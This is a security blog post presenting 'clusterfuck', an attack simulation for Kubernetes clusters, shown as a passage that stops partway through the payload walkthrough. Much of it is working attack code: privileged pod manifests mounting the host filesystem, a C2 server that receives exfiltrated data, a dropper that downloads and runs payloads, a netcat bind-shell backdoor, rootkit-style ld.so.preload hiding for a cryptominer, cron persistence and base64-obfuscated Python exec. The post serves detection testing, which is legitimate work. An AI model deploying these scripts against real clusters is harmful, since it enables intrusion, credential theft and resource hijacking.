---
title: "clusterfuck: attack sims on k8s clusters"
date: 2025-04-09T18:37:22Z
draft: false
toc: true
next: true
nomenu: false
notitle: false
---

## tl;dr

[clusterfuck](https://github.com/bilals12/clusterfuck) is a multi-stage attack simulation against k8s environments. it performs executing privilege escalation, container escape, credential theft, lateral movement, and crypto mining techniques. it's designed to validate detection capabilities in your cloud security posture management (CSPM) and endpoint detection and response (EDR) tools. when successful, it triggers 20+ high-severity security alerts across the attack chain, helping security teams test their defenses, improve detection coverage, and practice incident response. 

## cluster security 101

modern containerized environments demand specific security attention. in kubernetes:

- container boundaries separate processes from the host system, but privileged containers can bypass these boundaries entirely

- service account tokens mounted into every pod can become dangerous credentials

- RBAC permissions often extend farther than developers realize

- host filesystem access turns an isolated container into a potential gateway to your entire infrastructure

the attack simulation concentrates on these exact weak points, demonstrating how an attacker chains them together to pivot from compromised container to full system access.
clusterfuck employs techniques we've observed in real-world container attacks, not theoretical scenarios. it leverages container escape through privileged containers, process hiding via eBPF, credential theft targeting both Kubernetes and AWS, and C2 communication that mimics actual attacker behavior.

## attack sequence

### overview

```mermaid
┌─────────────────────────┐           ┌─────────────────────────┐
│                         │           │                         │
│    Attack Sim Pod       │◄─────────►│    Payload Server       │
│    (sim-pod)            │   C2      │    (payload-server)     │
│                         │           │                         │
└───────────┬─────────────┘           └─────────────────────────┘
            │                            ▲
            │ Host Mount                 │
            │                            │
            ▼                            │
┌─────────────────────────┐              │
│                         │              │
│    Kubernetes Node      │◄─────────────┘
│    (Host System)        │  Data Exfiltration
│                         │
└─────────────────────────┘
```

unlike general security testing tools, clusterfuck executes a meticulously engineered attack sequence:

1. container escape: the attack pod leverages its privileged context to mount and access the host filesystem via direct volume mounts (/).

2. system reconnaissance: clusterfuck explores writable directories, permission structures, and established processes, similar to an attacker's initial foothold phase.

3. process manipulation: uses `ld.so.preload` manipulations and eBPF techniques to hide malicious processes from monitoring tools.

3. kubernetes token theft: extracts the service account token from its standard location (`/var/run/secrets/kubernetes.io/serviceaccount/`) and exfiltrates it to the payload server.

4. AWS credential theft: searches for credentials in environment variables and filesystem locations, capturing both IAM role data and access keys.

5. C2: establishes reverse shell connections using multiple techniques (Python socket-based shells, traditional Bash `/dev/tcp` connections) for redundancy.

6. persistence: creates cron jobs for the extracted miner payload and hides executables in system locations.

7. simulated resource hijack: runs a time-limited cryptocurrency miner simulation to trigger resource consumption alerts.

### architecture

clusterfuck consists of 2 purpose built components:

1. the attack simulation pod (`sim-pod`)

2. the payload server (`payload-server`)

the attack simulation pod is defined in `attack-sim-deploy.yaml` and is the heart of the simulation.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sim-pod
  namespace: default
  labels:
    app: attack-sim
  annotations:
    container.apparmor.security.beta.kubernetes.io/attack-sim: unconfined
spec:
  containers:
  - name: attack-sim
    image: bilals12/attack-sim:latest
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
      capabilities:
        add: ["NET_ADMIN", "SYS_ADMIN", "SYS_PTRACE", "ALL"]
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
    - name: host-fs
      mountPath: /host
    - name: run-systemd
      mountPath: /run/systemd
    - name: var-log
      mountPath: /var/log
    - name: aws-credentials
      mountPath: /etc/bsssq-secrets/aws
      readOnly: true
```

the `unconfined` AppArmor annotation disables Linux kernel security restrictions. the pod runs in the `default` namespace, which has fewer restrictions than dedicated namespaces, and the `attack-sim` label is used for NetworkPolicy targeting.

```yaml
spec:
  containers:
  - name: attack-sim
    image: bilals12/attack-sim:latest
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
      capabilities:
        add: ["NET_ADMIN", "SYS_ADMIN", "SYS_PTRACE", "ALL"]
```

`privileged: true` completely breaks container isolation. this should give the container near-host equivalent permissions. there are some others here too:

- `NET_ADMIN`: this manipulates network configurations

- `SYS_ADMIN`: this performs system admin operations

- `SYS_PTRACE`: this attaches to other processes

- `ALL`: this grants all possible Linux capabilities

we also define some attack parameters here:

```yaml
env:
    - name: PAYLOAD_SERVER
      value: "`payload-server.default.svc.cluster.local"
    - name: PAYLOAD_SERVER_PORT
      value: "8080"
    - name: AWS_CREDENTIAL_PATH
      value: "/etc/bsssq-secrets/aws"
    - name: ENABLE_CLOUD_ENUMERATION
      value: "true"
```

the C2 server is located at `payload-server.default.svc.cluster.local`. the location of the AWS credentials are defined, and the flag to allow cloud enumeration techniques.

i've also defined some more container escape vectors here:

```yaml
volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
    - name: host-fs
      mountPath: /host
    - name: run-systemd
      mountPath: /run/systemd
    - name: var-log
      mountPath: /var/log
    - name: aws-credentials
      mountPath: /etc/bsssq-secrets/aws
      readOnly: true
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
  - name: host-fs
    hostPath:
      path: /
```

this allows mounting the Docker socket, which enables container-container attacks. mounting the root filesystem `/` grants access to all host files. we'll also mount `systemd` access and `/var/log`. 

finally, to allow excessively permissive communication with the payload server, we'll define a loose NetworkPolicy configuration.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-payload-access
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: attack-sim
  policyTypes:
  - Egress
  - Ingress
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: payload-server
    ports:
    - protocol: TCP
      port: 8080
  - to: []  # Allow all outbound traffic
  ingress:
  - from: []  # Allow all inbound traffic
```



the Dockerfile for the [image here](https://hub.docker.com/layers/bilals12/sim/latest/images/sha256:d9800967d613ab69ba661c6772911082d940c20335bd9073427764dfec63a3d5?uuid=7660b258-5398-4e6a-b756-31faeb4add7e%0A) sets up the attack environment.

```Dockerfile
# Dockerfile.sim
FROM ubuntu:20.04

# Avoid interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC

# Set default environment variables for configuration
ENV PAYLOAD_SERVER="payload-server"
ENV PAYLOAD_PORT="8080"
ENV REVERSE_SHELL_PORT="4444"
ENV BACKUP_SHELL_PORT="7456"
ENV AWS_CREDENTIAL_PATH="/etc/bsssq-secrets/aws"
ENV ENABLE_CLOUD_ENUMERATION="true"
ENV HIDDEN_DIR="/dev/shm/.../...HIDDEN..."

# Install required tools
RUN apt-get update && apt-get install -y \
    tar \
    python3 \
    python3-pip \
    curl \
    wget \
    netcat \
    iproute2 \
    dnsutils \
    && rm -rf /var/lib/apt/lists/*

# Install Python libraries
RUN pip3 install requests

# Copy the sim.tar file
COPY sim.tar /sim.tar

# Create necessary directories
RUN mkdir -p /payloads && \
    mkdir -p $HIDDEN_DIR && \
    mkdir -p /tmp/payloads && \
    tar -xf /sim.tar -C /payloads && \
    chmod +x /payloads/*
```

the payload server is defined in `payload-server.yaml`.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payload-server
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payload-server
  template:
    metadata:
      labels:
        app: payload-server
```

this is deployed as a Kubernetes Deployment (not a Pod). using a Deployment means automatic restart if the pod crashes. the same `app: payload-server` label links it to the NetworkPolicy.

the payload server requests privileged mode. not necessary, but attackers do often request excessive persmissions.

```yaml
spec:
      containers:
      - name: payload-server
        image: bilals12/payload-server:latest
        securityContext:
          privileged: true
```

then, we define some key attack components.

```yaml
command: ["/bin/bash", "-c"]
        args:
        - |
          # Create uploads directory
          mkdir -p /payloads/uploads
          mkdir -p /payloads/shells
          
          # Install netcat if not already present
          apt-get update && apt-get install -y netcat-openbsd netcat-traditional 2>/dev/null || true
```

this creates directories for storing exfiltrated data and shell session logs. we also have to make sure that netcat is available for establishing reverse shells.

since we're trying to spawn a reverse shell, let's add some logging and fallback options.

```yaml
          cat > /payloads/shell_logger.sh << 'EOT'
          #!/bin/bash
          PORT=$1
          LOG_FILE="/payloads/shells/shell_${PORT}_$(date +%s).log"
          
          echo "Starting listener on port $PORT, logging to $LOG_FILE"
          echo "Listener started at $(date)" > $LOG_FILE
          
          # First try with netcat-traditional (GNU netcat) which supports -e
          if command -v nc.traditional &> /dev/null; then
              echo "Using nc.traditional on port $PORT" | tee -a $LOG_FILE
              nc.traditional -l -p $PORT -v 2>&1 | tee -a $LOG_FILE
```

this should support multiple variants and create timestamped log files for each connection.

to set up our C2 functions, we'll run a simple python HTTP server.

```yaml
# Create a basic HTTP server that logs more information
          cat > /payloads/server.py << 'EOT'
          #!/usr/bin/env python3
          #!/usr/bin/env python3
          import http.server
          import socketserver
          import os
          import cgi
          import json
          import base64
          from datetime import datetime

          PORT = 8080
          UPLOAD_DIR = "/payloads/uploads"

          os.makedirs(UPLOAD_DIR, exist_ok=True)

          class CustomHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
              def _set_headers(self, status_code=200, content_type='text/html'):
                  self.send_response(status_code)
                  self.send_header('Content-type', content_type)
                  self.end_headers()
              
              def do_GET(self):
                  print(f"[{datetime.now()}] GET request received: {self.path}")
                  
                  if self.path == '/':
                      self.path = '/index.html'
                  
                  try:
                      file_path = f"/payloads{self.path}"
                      if os.path.exists(file_path) and os.path.isfile(file_path):
                          with open(file_path, 'rb') as file:
                              self._set_headers(200)
                              self.wfile.write(file.read())
                          print(f"[{datetime.now()}] Served file: {file_path}")
                      else:
                          self._set_headers(404)
                          self.wfile.write(b"File not found")
                          print(f"[{datetime.now()}] File not found: {file_path}")
                  except Exception as e:
                      self._set_headers(500)
                      self.wfile.write(str(e).encode())
                      print(f"[{datetime.now()}] Error: {e}")
              
              def do_POST(self):
                  print(f"[{datetime.now()}] POST request received: {self.path}")
                  
                  try:
                      form = cgi.FieldStorage(
                          fp=self.rfile,
                          headers=self.headers,
                          environ={'REQUEST_METHOD': 'POST'}
                      )
                      
                      timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                      print(f"[{datetime.now()}] Headers: {self.headers}")
                      
                      if 'file' in form:
                          fileitem = form['file']
                          if fileitem.file:
                              filename = f"{timestamp}_{fileitem.filename if hasattr(fileitem, 'filename') and fileitem.filename else 'data.bin'}"
                              file_path = os.path.join(UPLOAD_DIR, filename)
                              with open(file_path, 'wb') as f:
                                  f.write(fileitem.file.read())
                              
                              print(f"[{datetime.now()}] Saved file: {file_path}")
                              print(f"[{datetime.now()}] Size: {os.path.getsize(file_path)}")
                              
                              try:
                                  with open(file_path, 'r') as f:
                                      content = f.read(1000)
                                      print(f"[{datetime.now()}] Content: {content}")
                              except UnicodeDecodeError:
                                  print(f"[{datetime.now()}] Binary file")
                              
                              self._set_headers(200)
                              self.wfile.write(b"File uploaded successfully")
                          else:
                              self._set_headers(400)
                              self.wfile.write(b"No file content")
                      else:
                          content_length = int(self.headers.get('Content-Length', 0))
                          if content_length > 0:
                              post_data = self.rfile.read(content_length)
                              data_file = os.path.join(UPLOAD_DIR, f"{timestamp}_data.bin")
                              with open(data_file, 'wb') as f:
                                  f.write(post_data)
                              print(f"[{datetime.now()}] Raw data saved: {data_file}")
                              print(f"[{datetime.now()}] Data: {post_data[:100]}")
                              
                              self._set_headers(200)
                              self.wfile.write(b"Data received")
                          else:
                              self._set_headers(400)
                              self.wfile.write(b"No data received")
                  except Exception as e:
                      self._set_headers(500)
                      self.wfile.write(str(e).encode())
                      print(f"[{datetime.now()}] Error: {e}")

          httpd = socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler)
          print(f"[{datetime.now()}] Starting server on port {PORT}")
          print(f"[{datetime.now()}] Uploads dir: {UPLOAD_DIR}")
          httpd.serve_forever()
```

this C2 needs to be able to serve malicious payloads via `GET` requests and receive exfiltrated data via `POST` requests. the above script should allow processing of multipart form uploads that contain stolen data. 

the Kubernetes Service exposes the payload server:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: payload-server
  namespace: default
spec:
  selector:
    app: payload-server
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  - name: shell1
    port: 4444
    targetPort: 4444
  - name: shell2
    port: 7456
    targetPort: 7456
  - name: echo
    port: 4445
    targetPort: 4445
```

we now have a stable DNS name: `payload-server.default.svc.cluster.local`. we have exposed multiple C2 channels, and created an echo service for connectivity testing.

the payload server uses the [image from here](https://hub.docker.com/layers/bilals12/payload-server/latest/images/sha256:fc8d9000d39b8d9efb38476b61594639fac8ff5ba69ed7dea0fe6b669c84290b?uuid=7660b258-5398-4e6a-b756-31faeb4add7e%0A), called `Dockerfile.payload`.

```Dockerfile
FROM python:3.9-slim

# Avoid interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC

# Set configurable ports
ENV HTTP_PORT=8080
ENV SHELL_PORT_1=4444
ENV SHELL_PORT_2=7456

# Install necessary tools
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    netcat-openbsd \
    netcat-traditional \
    && rm -rf /var/lib/apt/lists/*

# Create payload directory structure
RUN mkdir -p /payloads/uploads && \
    mkdir -p /payloads/shells

# Copy payloads
COPY xmx2 /payloads/
COPY www /payloads/
COPY cc.py /payloads/
COPY pt /payloads/
COPY xmx2.so /payloads/
COPY run.sh /payloads/
COPY noumt /payloads/
COPY config.json /payloads/

# Set permissions
RUN chmod +x /payloads/*
```

here we define some functions for data capture and exfiltration, and some sample data files for API endpoints.

```Dockerfile
RUN echo '{"RoleName":"example-k8s-admin-role","RoleId":"AROAEXAMPLEROLEID111","Path":"/","CreateDate":"2023-01-15T14:22:31Z","AssumeRolePolicyDocument":{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}}' > /payloads/iam-role && \
    echo '{"AccessKeyId":"AKIAEXAMPLEKEYID111","SecretAccessKey":"ExampleSecretAccessKey111222333444555","Token":"ExampleTokenStringForTestingPurposesOnly111222333","Expiration":"2023-01-01T12:00:00Z"}' > /payloads/aws-keys
```

i've also implemented a shell logger for tracking reverse shell connections.

```Dockerfile
# Create a script to log reverse shell connections
RUN echo '#!/bin/bash\n\
PORT=$1\n\
LOG_FILE="/payloads/shells/shell_${PORT}_$(date +%s).log"\n\
\n\
echo "Starting listener on port $PORT, logging to $LOG_FILE"\n\
echo "Listener started at $(date)" > $LOG_FILE\n\
\n\
# First try with netcat-traditional (GNU netcat) which supports -e\n\
if command -v nc.traditional &> /dev/null; then\n\
    echo "Using nc.traditional on port $PORT" | tee -a $LOG_FILE\n\
    nc.traditional -l -p $PORT -v 2>&1 | tee -a $LOG_FILE\n\
# Then try with netcat-openbsd which supports -l\n\
elif command -v nc.openbsd &> /dev/null; then\n\
    echo "Using nc.openbsd on port $PORT" | tee -a $LOG_FILE\n\
    nc.openbsd -l -p $PORT -v 2>&1 | tee -a $LOG_FILE\n\
# Fall back to whatever nc is available\n\
else\n\
    echo "Using default nc on port $PORT" | tee -a $LOG_FILE\n\
    nc -l -p $PORT -v 2>&1 | tee -a $LOG_FILE\n\
fi\n\
\n\
echo "Listener on port $PORT exited at $(date)" >> $LOG_FILE\n\
# Automatically restart the listener\n\
exec $0 $PORT\n' > /payloads/shell_logger.sh
```

the HTTP server implementation is the mechanism for receiving and storing the exfiltrated data.

```Dockerfile
# Create HTTP server script
RUN echo '#!/usr/bin/env python3\n\
import http.server\n\
import socketserver\n\
import os\n\
import cgi\n\
import json\n\
import base64\n\
import sys\n\
from datetime import datetime\n\
\n\
# Get port from environment or use default\n\
PORT = int(os.environ.get("HTTP_PORT", 8080))\n\
UPLOAD_DIR = "/payloads/uploads"\n\
\n\
os.makedirs(UPLOAD_DIR, exist_ok=True)\n\
\n\
class CustomHTTPRequestHandler(http.server.BaseHTTPRequestHandler):\n\
    def _set_headers(self, status_code=200, content_type="text/html"):\n\
        self.send_response(status_code)\n\
        self.send_header("Content-type", content_type)\n\
        self.end_headers()\n\
    \n\
    def do_GET(self):\n\
        print(f"[{datetime.now()}] GET request received: {self.path}")\n\
        \n\
        if self.path == "/":\n\
            self.path = "/index.html"\n\
        \n\
        try:\n\
            file_path = f"/payloads{self.path}"\n\
            if os.path.exists(file_path) and os.path.isfile(file_path):\n\
                with open(file_path, "rb") as file:\n\
                    self._set_headers(200)\n\
                    self.wfile.write(file.read())\n\
                print(f"[{datetime.now()}] Served file: {file_path}")\n\
            else:\n\
                self._set_headers(404)\n\
                self.wfile.write(b"File not found")\n\
                print(f"[{datetime.now()}] File not found: {file_path}")\n\
        except Exception as e:\n\
            self._set_headers(500)\n\
            self.wfile.write(str(e).encode())\n\
            print(f"[{datetime.now()}] Error: {e}")\n\
```

the Dockerfile also configures an entrypoint script that launches all the server components.

```Dockerfile
# Create entrypoint script
RUN echo '#!/bin/bash\n\
echo "Starting payload server..."\n\
echo "HTTP_PORT: $HTTP_PORT"\n\
echo "SHELL_PORT_1: $SHELL_PORT_1"\n\
echo "SHELL_PORT_2: $SHELL_PORT_2"\n\
\n\
# Start HTTP server\n\
cd /payloads && python3 server.py &\n\
\n\
# Start shell listeners with logging\n\
/payloads/shell_logger.sh $SHELL_PORT_1 &\n\
/payloads/shell_logger.sh $SHELL_PORT_2 &\n\
\n\
# Create a simple echo server for testing basic connectivity\n\
(while true; do { echo -e "HTTP/1.1 200 OK\\n\\n$(date) - Simple Echo Server"; } | nc -l -p 4445; done) &\n\
\n\
# Keep container running\n\
tail -f /dev/null\n' > /entrypoint.sh

# Make entrypoint executable
RUN chmod +x /entrypoint.sh

# Expose ports
EXPOSE $HTTP_PORT $SHELL_PORT_1 $SHELL_PORT_2 4445

# Start services
CMD ["/entrypoint.sh"]
```

this architecture is completed by a [general-purpose attack container](https://hub.docker.com/layers/bilals12/sim/attack-sim/images/sha256:a0f27fb162b5204f4bd5ef241380263fdd773d092e99e648c5fbe0cecb4ed10c?uuid=7660b258-5398-4e6a-b756-31faeb4add7e%0A).

```Dockerfile
FROM ubuntu:20.04

# Avoid interactive prompts during installation
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC

# Install necessary tools
RUN apt-get update && apt-get install -y \
    socat \
    python3 \
    python3-pip \
    curl \
    wget \
    cron \
    net-tools \
    inotify-tools \
    docker.io \
    netcat \
    awscli \
    unzip \
    procps \
    less \
    jq \
    openssh-server \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip3 install requests boto3==1.26.0 botocore==1.29.0 awscli==1.27.0
```

here we pre-configure some vulnerable services and credentials.

```Dockerfile
# Setup SSH server to listen on port 22
RUN mkdir /var/run/sshd
RUN echo 'root:password' | chpasswd
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Setup vulnerable services
# Netcat listener on port 4444
RUN echo '#!/bin/bash\nwhile true; do nc -l -p 4444 -e /bin/bash || sleep 10; done' > /usr/local/bin/nc-backdoor && \
    chmod +x /usr/local/bin/nc-backdoor
```

and create some intentionally insecure credential files to be discovered during the attack simulation (if they don't already exist).

```Dockerfile
# Create sensitive files with credentials
RUN mkdir -p /root/.aws && \
    echo '[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion = us-west-2' > /root/.aws/credentials

RUN mkdir -p /root/.kube && \
    echo 'apiVersion: v1\nclusters:\n- cluster:\n    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUI=\n    server: https://kubernetes.default.svc\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubernetes-admin\n  name: kubernetes-admin@kubernetes\ncurrent-context: kubernetes-admin@kubernetes\nkind: Config\npreferences: {}\nusers:\n- name: kubernetes-admin\n  user:\n    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUI=\n    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0aBcEE=' > /root/.kube/config
```

## attack

### dropper

when `sim-pod` gets created, it automatically executes a dropper script: `dropper.sh`. this is the entry point. `payload-server` gets deployed to act as the C2 server.

`dropper.sh` downloads all the attack components first. it then runs the main payload script `run.sh` and keeps the container alive. `run.sh` performs the multi-stage attack sequence and exfiltrates the data to the payload server.

```bash
#!/bin/bash
mkdir -p /tmp/payloads
cd /tmp/payloads

# Download payloads from the payload server
echo "Downloading payloads from payload server..."
curl -s http://payload-server.default.svc.cluster.local:8080/xmx2 -o xmx2 || echo "Failed to download xmx2"
curl -s http://payload-server.default.svc.cluster.local:8080/www -o www || echo "Failed to download www"
curl -s http://payload-server.default.svc.cluster.local:8080/cc.py -o cc.py || echo "Failed to download cc.py"
curl -s http://payload-server.default.svc.cluster.local:8080/pt -o pt || echo "Failed to download pt"
curl -s http://payload-server.default.svc.cluster.local:8080/xmx2.so -o xmx2.so || echo "Failed to download xmx2.so"
curl -s http://payload-server.default.svc.cluster.local:8080/run.sh -o run.sh || echo "Failed to download run.sh"
curl -s http://payload-server.default.svc.cluster.local:8080/config.json -o config.json || echo "Failed to download config.json"
curl -s http://payload-server.default.svc.cluster.local:8080/noumt -o noumt || echo "Failed to download noumt"

# Set permissions
chmod +x xmx2 www cc.py pt run.sh noumt

# Copy files to their destinations
cp run.sh /root/run.sh
mkdir -p /sbin
cp config.json /sbin/config.json 2>/dev/null
cp xmx2.so /tmp/payloads/xmx2.so 2>/dev/null
cp noumt /dev/shm/noumt 2>/dev/null

# Execute the attack
echo "Executing run.sh..."
bash /root/run.sh || echo "Failed to execute run.sh, check logs"

# Keep container running
echo "Dropper script completed, keeping container alive"
tail -f /dev/null 
```

the dropper creates a temporary directory for malicious payloads. attacks like to use temporary directories to evade detection.

it then downloads several attack tools from our C2 (with the `-s` flag to hide the download progress), with each serving a specific purpose. 

`xmx2` is a process hiding tool (a XMRig cryptominer executable). `xmx2.so` is a shared library for process hiding via `LD_PRELOAD`, and so on. the tools themselves will probably be the subject of another post. 

the dropper makes all these tools executable and distributes them accross the filesystem (`/root/`, `/sbin/`, `/dev/shm/`). it keeps the pod running with `tail -f /dev/null`. 


### payload

`run.sh` is a much larger script that performs a bunch of things. we'll go through each stage of the attack here.

```bash
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
```

this sets our home directory to `/root/` and configures the locale and PATH variables to make sure commands can be found regardless of environment settings.

```bash
DIR_ARRAY=("/tmp" "/var/tmp" "/dev/shm" "/bin" "/sbin" "/usr/bin" "/usr/sbin")
```

this is the target directory list. they're common writeable locations used for file drops and persistence.

```bash
# Enhanced download function to handle connection issues and log details
download() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  
  log "$BLUE" "Attempting to connect to $HOST:$PORT$DOC"
  
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  # Try payload server first if the original host is unreachable
  if [ "$HOST" = "169.254.169.254" ]; then
    log "$YELLOW" "AWS metadata IP is unreachable, trying payload server instead"
    HOST="payload-server.default.svc.cluster.local"
    PORT=8080
    DOC="/"
  fi

  # Connect with proper error handling
  exec 3<>/dev/tcp/${HOST}/$PORT 2>/dev/null || {
    log "$RED" "Connection to $HOST:$PORT failed, using fallback"
    return 1
  }
  
  log "$GREEN" "Successfully connected to $HOST:$PORT"
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  
  log "$BLUE" "Request sent, waiting for response..."
  
  while IFS= read -r line ; do
      [[ "$line" == $'\r' ]] && break
  done <&3
  
  log "$GREEN" "Received response headers, reading data..."
  
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
      printf "%s$nul" "$x"
  done <&3
  
  exec 3>&-
  log "$GREEN" "Download completed from $HOST:$PORT$DOC"
}
```

this is the data exfiltration function. it parses the URL into components (protocol, server, path) and handles the HTTP connections for exfiltration. it uses `/dev/tcp` for network connections instead of `curl` and formats the requests for proper parsing.

```bash
log "$CYAN" "Handling some filemods ..."
CHECKCHMOD=`command -v mchmod`
if ! [ -z "$CHECKCHMOD" ] ; then 
  log "$BLUE" "Found mchmod, removing immutable attributes from chmod"
  mchattr -ia $(command -v chmod) 
  tntrecht -ia  $(command -v chmod) 
  mchmod +x  $(command -v chmod) 
fi

CHECKCHATTR=`command -v mchattr`
if ! [ -z "$CHECKCHATTR" ] ; then 
  log "$BLUE" "Found mchattr, removing immutable attributes from chattr"
  mchattr -ia $(command -v chattr) 
  tntrecht -ia  $(command -v chattr) 
  mchmod +x  $(command -v chattr) 
  chmod +x  $(command -v chattr) 
fi
```

this function manipulates file permissions. it disables file immutability protections and targets system binaries (`chmod`, `chattr`) that control file permissions.

```bash
log "$CYAN" "Handling preload ld ..."
if [ -f "/etc/ld.so.preload" ] ; then 
  log "$YELLOW" "Found: /etc/ld.so.preload"
  chattr -ia / /etc/ /etc/ld.so.preload
  log "$YELLOW" "Current preload content:"
  cat /etc/ld.so.preload
  rm -f /etc/ld.so.preload 
else 
  log "$BLUE" "No /etc/ld.so.preload file found!"
fi
```

this function tries to hijack the shared library. `LD_PRELOAD` is a feature that allows library function interception, so it checks for an existing `LD_PRELOAD` configuration and removes immutable attributes from it if it exists. it deletes the existing preload file and replaces it with a malicious one.

```bash
log "$CYAN" "Handling dir permissions ld ..."
for DIR in "${DIR_ARRAY[@]}"; do
  if [ -d "$DIR" ] ; then 
    log "$GREEN" "$DIR found."
    if [ -w "$DIR" ] ; then 
      log "$GREEN" "Write rights in $DIR available."
    else 
      log "$YELLOW" "No write permissions in $DIR available. Try to fix the error."
      chattr -ia "$DIR"
      if [ -w "$DIR" ] ; then 
        log "$GREEN" "Write rights in $DIR available."
      else 
        log "$RED" "Still no write access in $DIR."
      fi
    fi
  else 
    log "$RED" "$DIR not found."
  fi
done
```

this function performs recon on directory permissions. it checks the writability of the common directories and tries to modify the permissions using `chattr` if they're not writable. it maps the filesystem for locations that are suitable for dropping malicious paths. 

```bash
log "$CYAN" "Handling download XMRig ..."
if [ -w /usr/sbin ] ; then 
  export SPATH=/usr/sbin
  log "$GREEN" "Using /usr/sbin for binary path"
elif [ -w /tmp ] ; then 
  export SPATH=/tmp
  log "$GREEN" "Using /tmp for binary path"
elif [ -w /var/tmp ] ; then 
  export SPATH=/var/tmp
  log "$GREEN" "Using /var/tmp for binary path"
fi

# These files are already downloaded by dropper.sh in /tmp/payloads
log "$BLUE" "Copying binaries from /tmp/payloads to $SPATH"
cp /tmp/payloads/xmx2 $SPATH/xmx2
cp /tmp/payloads/www $SPATH/www
cp /tmp/payloads/cc.py $SPATH/cc.py
cp /tmp/payloads/pt $SPATH/pt
chmod +x $SPATH/xmx2
chmod +x $SPATH/www
chmod +x $SPATH/pt
```

this bit prepares our malware. based on directory permissions, it selects the suitable placement for each file (preferably `/usr/sbin` to appear legitimate) and falls back to temporary directories if the system directories aren't writable. 

```bash
log "$CYAN" "Adding library to hide xmrig process..."
if [ "$SPATH" = "/usr/sbin" ] ; then 
  log "$BLUE" "Removing immutable attributes from system directories"
  chattr -ia / /usr/ /usr/local/ /usr/local/lib/
  
  # Use pre-downloaded xmx2.so from /tmp/payloads
  log "$BLUE" "Copying xmx2.so to /usr/local/lib/"
  cp /tmp/payloads/xmx2.so /usr/local/lib/xmx2.so
  
  if [ -f "/etc/ld.so.preload" ]; then
    log "$BLUE" "Checking if xmx2.so is in preload file"
    cat /etc/ld.so.preload | grep '/usr/local/lib/xmx2.so' 1>/dev/null || {
      log "$YELLOW" "Adding xmx2.so to preload file"
      chattr -ia / /etc/ /etc/ld.so.preload
      echo '/usr/local/lib/xmx2.so' > /etc/ld.so.preload
    }
  else
    log "$YELLOW" "Creating new preload file with xmx2.so"
    echo "" > /etc/ld.so.preload
  fi
  
  log "$BLUE" "Setting immutable attribute on preload file"
  chattr +i /etc/ld.so.preload 
fi
```

this begins the process hiding implementation. the shared library `xmx2.so` is installed via function hooking. it uses `LD_PRELOAD` to intercept syscalls like `readdir` and `opendir`. it configures the library to filter out mining processes from process listing tools and makes the preload file immutable to prevent easy removal.

```bash
log "$CYAN" "Creating persistence with a cron job ..."
mkdir -p /var/spool/cron/crontabs
touch /var/spool/cron/crontabs/root
(crontab -l; echo "@reboot ${SPATH}/xmx2") | crontab -
log "$BLUE" "Checking for existing backdoor crons:"
if [ -f "/etc/cron.d/backdoor" ]; then
  log "$YELLOW" "Found existing backdoor cron:"
  cat /etc/cron.d/backdoor
else
  log "$BLUE" "No backdoor cron found"
fi
```

this is our persistence mechanism. it creates a cron job to restart the miner upon system reboot. it checks for existing backdoor crons that might interfer and uses `crontab` to modify the user's crontab entries.

```bash
log "$CYAN" "Searching for secrets and sending them to C2 ..."
chattr -ia / /var/ /var/tmp/
```

this prepares the filesystem to collect the sensitive data (secrets).

```bash
log "$MAGENTA" "Executing Base64-encoded Python command to mount /dev/shm"
python3 -c 'import base64; scc = base64.b64decode("aW1wb3J0IGN0eXBlczsgY3R5cGVzLkNETEwoImxpYmMuc28uNiIpLm1vdW50KE5vbmUsIGIiL2Rldi9zaG0iLCBOb25lLCA0MDk2IHwgMzIsIGIiIik7Cg==");exec(scc)'
log "$BLUE" "Base64 command decodes to: import ctypes; ctypes.CDLL(\"libc.so.6\").mount(None, b\"/dev/shm\", None, 4096 | 32, b\"\")"
```

this is a container escape technique that leverages `ctypes` to make direct syscalls to `libc.so.6`. it attempts to remount the `/dev/shm` directory (a temporary filesystem for shared memory). `4096` is the opcode that corresponds to `MS_BIND`, which creates a bind mount (mirroring a directory to another location). `32` corresponds to `MS_REMOUNT`, which updates existing mount options.

